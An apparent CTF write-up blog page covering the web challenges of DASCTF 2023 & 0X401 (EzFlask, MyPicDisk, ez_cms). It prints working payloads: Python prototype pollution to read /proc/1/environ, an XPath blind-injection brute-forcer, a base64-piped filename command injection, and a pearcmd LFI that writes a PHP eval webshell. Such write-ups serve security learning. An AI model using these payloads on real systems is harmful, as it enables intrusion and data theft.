@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/gkjzjh146.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "gkjzjh146",
+    
+    "image": "https://gkjzjh146.github.io/images/1.jpg"
+    
+  },
+  "name":"gkjzjh146",
+  "description":"",
+  "url":"https:\/\/gkjzjh146.github.io\/post\/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B\/",
+  "keywords":"[wp]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="gkjzjh146">
+<meta name="keywords" content="wp">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【DASCTF 2023 &amp; 0X401七月暑期挑战赛】MISC&amp;WEB">
+<meta name="twitter:title" content="【DASCTF 2023 &amp; 0X401七月暑期挑战赛】MISC&amp;WEB">
+<meta property="og:url" content="https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/">
+<meta property="twitter:url" content="https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/">
+<meta property="og:site_name" content="gkjzjh146">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2023-08-01T19:30:38">
+  
+  
+    <meta property="article:modified_time" content="2023-08-01T19:30:38">
+  
+  
+  
+    
+      <meta property="article:section" content="ctf">
+    
+      <meta property="article:section" content="misc">
+    
+      <meta property="article:section" content="web">
+    
+  
+  
+    
+      <meta property="article:tag" content="wp">
+    
+      <meta property="article:tag" content="2023">
+    
+      <meta property="article:tag" content="misc">
+    
+      <meta property="article:tag" content="web">
+    
+      <meta property="article:tag" content="dasctf">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/4.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/4.jpeg">
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/401.png">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/401.png">
+
+
+    <title>【DASCTF 2023 &amp; 0X401七月暑期挑战赛】MISC&amp;WEB</title>
+
+    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://gkjzjh146.github.io/post/dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
+          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">gkjzjh146</h4>
+        
+          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('/4.jpeg')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      【DASCTF 2023 &amp; 0X401七月暑期挑战赛】MISC&amp;WEB
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2023-08-01T19:30:38&#43;08:00">
+        
+  八月 1, 2023
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/ctf">ctf</a>, 
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/misc">misc</a>, 
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/web">web</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#ezflask">EzFlask</a></li>
+        <li><a href="#mypicdisk">MyPicDisk</a></li>
+        <li><a href="#ez_cms">ez_cms</a></li>
+        <li><a href="#ez_py">ez_py</a></li>
+        <li><a href="#ez_timing">ez_timing</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#签到题">签到题</a></li>
+        <li><a href="#ezfat32">ezFAT32</a></li>
+        <li><a href="#coffee-desu">Coffee desu!</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+<h1 id="web">WEB</h1>
+<h2 id="ezflask">EzFlask</h2>
+<p>进去就拿到了源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, session
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> black_list
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid4())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> black_list:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">merge</span>(src, dst):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> src<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hasattr(dst, <span style="color:#e6db74">&#39;__getitem__&#39;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> dst<span style="color:#f92672">.</span>get(k) <span style="color:#f92672">and</span> type(v) <span style="color:#f92672">==</span> dict:
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#f92672">.</span>get(k))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#f92672">=</span> v
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> hasattr(dst, k) <span style="color:#f92672">and</span> type(v) <span style="color:#f92672">==</span> dict:
+</span></span><span style="display:flex;"><span>            merge(v, getattr(dst, k))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            setattr(dst, k, v)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">user</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(self, data):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> data[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>password <span style="color:#f92672">==</span> data[<span style="color:#e6db74">&#39;password&#39;</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Users <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/register&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>data:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> check(request<span style="color:#f92672">.</span>data):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Register Failed&#34;</span>
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(request<span style="color:#f92672">.</span>data)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> data <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Register Failed&#34;</span>
+</span></span><span style="display:flex;"><span>            User <span style="color:#f92672">=</span> user()
+</span></span><span style="display:flex;"><span>            merge(data, User)
+</span></span><span style="display:flex;"><span>            Users<span style="color:#f92672">.</span>append(User)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Register Failed&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Register Success&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Register Failed&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/login&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>data:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(request<span style="color:#f92672">.</span>data)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> data <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Login Failed&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> Users:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> user<span style="color:#f92672">.</span>check(data):
+</span></span><span style="display:flex;"><span>                    session[<span style="color:#e6db74">&#34;username&#34;</span>] <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#34;username&#34;</span>]
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Login Success&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Login Failed&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Login Failed&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> open(__file__, <span style="color:#e6db74">&#34;r&#34;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5010</span>)
+</span></span></code></pre></div><p>看到merge就可以联想到原型链污染</p>
+<p><a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">Python原型链污染变体(prototype-pollution-in-python) - Article_kelp - 博客园 (cnblogs.com)</a></p>
+<p>看到这个</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230801215303268.png" alt="image-20230801215303268"></p>
+<p>那么可以利用payload为</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;6&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&#34;</span>:{
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;__globals__&#34;</span>:{
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;__file__&#34;</span>:<span style="color:#e6db74">&#34;../../../proc/1/environ&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230801221913666.png" alt="image-20230801221913666"></p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230801221942447.png" alt="image-20230801221942447"></p>
+<p>除了污染<code>__FILE__</code>还可以污染<code>_static_folder</code></p>
+<pre tabindex="0"><code>{&#34;__init\u005f_&#34;:{&#34;__globals__&#34;:{&#34;app&#34;:{&#34;_static_folder&#34;:&#34;/&#34;}}},
+&#34;username&#34;:1,
+&#34;password&#34;:1
+}
+</code></pre><p>访问/static/proc/1/environ可以直接下载</p>
+<p>预期解是利用这个读文件，然后算pin码</p>
+<p>[DASCTF 2023 &amp; 0X401 Web WriteUp | Boogiepop Doesn&rsquo;t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/07/22/DASCTF">https://boogipop.com/2023/07/22/DASCTF</a> 2023 &amp; 0X401 Web WriteUp/#EzFlask)</p>
+<h2 id="mypicdisk">MyPicDisk</h2>
+<p>随便试试就能登录成功了，看到hint，<code>/y0u_cant_find_1t.zip</code></p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802004144793.png" alt="image-20230802004144793"></p>
+<p>去看源码发现这里存在一个盲注，可控点是username，可以利用这个拿到账户密码</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802112522689.png" alt="image-20230802112522689"></p>
+<p>直接用Boogipop师傅的脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://8973a3c8-894a-4cc3-a9e6-122b41222731.node4.buuoj.cn:81/index.php&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>strs <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> strs:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#猜测根节点名称</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># payload_1 = {&#34;username&#34;:&#34;&lt;username&gt;&#39;or substring(name(/*[1]), {}, 1)=&#39;{}&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&#34;.format(i,j),&#34;password&#34;:123}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#猜测子节点名称</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># payload_2 = &#34;&lt;username&gt;&#39;or substring(name(/root/*[1]), {}, 1)=&#39;{}&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;{}&lt;/token&gt;&#34;.format(i,j,token[0])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#猜测accounts的节点</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># payload_3 =&#34;&lt;username&gt;&#39;or substring(name(/root/accounts/*[1]), {}, 1)=&#39;{}&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;{}&lt;/token&gt;&#34;.format(i,j,token[0])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#猜测user节点</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># payload_4 =&#34;&lt;username&gt;&#39;or substring(name(/root/accounts/user/*[2]), {}, 1)=&#39;{}&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;{}&lt;/token&gt;&#34;.format(i,j,token[0])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#跑用户名和密码</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># payload_username =&#34;&lt;username&gt;&#39;or substring(/accounts/user[1]/username/text(), {}, 1)=&#39;{}&#39;  or &#39;&#39;=&#39;&#34;.format(i,j)</span>
+</span></span><span style="display:flex;"><span>        payload_username <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;username&gt;&#39;or substring(/accounts/user[1]/password/text(), </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, 1)=&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;  or &#39;&#39;=&#39;&#34;</span><span style="color:#f92672">.</span>format(i,j)
+</span></span><span style="display:flex;"><span>        data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;username&#34;</span>:payload_username,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#ae81ff">123</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;submit&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># payload_password =&#34;&lt;username&gt;&#39;or substring(/root/accounts/user[2]/password/text(), {}, 1)=&#39;{}&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;{}&lt;/token&gt;&#34;.format(i,j,token[0])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(payload_username)
+</span></span><span style="display:flex;"><span>        print(data)
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url,data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(r.text)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#003d7628772d6b57fec5f30ccbc82be1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;登录成功&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>            flag<span style="color:#f92672">+=</span>j
+</span></span><span style="display:flex;"><span>            print(flag)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;登录失败&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><p>结果是</p>
+<p><code>admin/003d7628772d6b57fec5f30ccbc82be1</code></p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802114829355.png" alt="image-20230802114829355"></p>
+<p><code>15035371139</code></p>
+<p>登录</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802120744269.png" alt="image-20230802120744269"></p>
+<p>看到文件名字可控，文件名拼接，命令执行即可</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802120807642.png" alt="image-20230802120807642"></p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802120856399.png" alt="image-20230802120856399"></p>
+<p>上传完后去访问一下</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802120938940.png" alt="image-20230802120938940"></p>
+<pre tabindex="0"><code>;echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;a.jpg
+</code></pre><p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802121034470.png" alt="image-20230802121034470"></p>
+<h2 id="ez_cms">ez_cms</h2>
+<p>熊海cms</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802121452300.png" alt="image-20230802121452300"></p>
+<p>弱密码进入后台，存在文件包含漏洞，这个文件包含的位置要注意</p>
+<pre tabindex="0"><code class="language-none" data-lang="none">+config-create+/&amp;r=../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+../../../../../../../../tmp/1.php
+</code></pre><p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802122148618.png" alt="image-20230802122148618"></p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802122328753.png" alt="image-20230802122328753"></p>
+<h2 id="ez_py">ez_py</h2>
+<p>django session pickle反序列化，有空再复现了</p>
+<p>[DASCTF 2023 &amp; 0X401 Web WriteUp | Boogiepop Doesn&rsquo;t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/07/22/DASCTF">https://boogipop.com/2023/07/22/DASCTF</a> 2023 &amp; 0X401 Web WriteUp/#ez-py)</p>
+<h2 id="ez_timing">ez_timing</h2>
+<p>关于http2的，直接看n03tAck的wp</p>
+<p><a href="https://mp.weixin.qq.com/s/4PdBJvd7mhzqjW1TEL6eyQ">https://mp.weixin.qq.com/s/4PdBJvd7mhzqjW1TEL6eyQ</a></p>
+<p>利用下面这个脚本拿flag</p>
+<p><a href="https://github.com/ConnorNelson/spaceless-spacing">https://github.com/ConnorNelson/spaceless-spacing</a></p>
+<h1 id="misc">MISC</h1>
+<h2 id="签到题">签到题</h2>
+<p>直接签到</p>
+<p><img src="https://gkjzjh146.github.io/DASCTF202307/image-20230802212217086.png" alt="image-20230802212217086"></p>
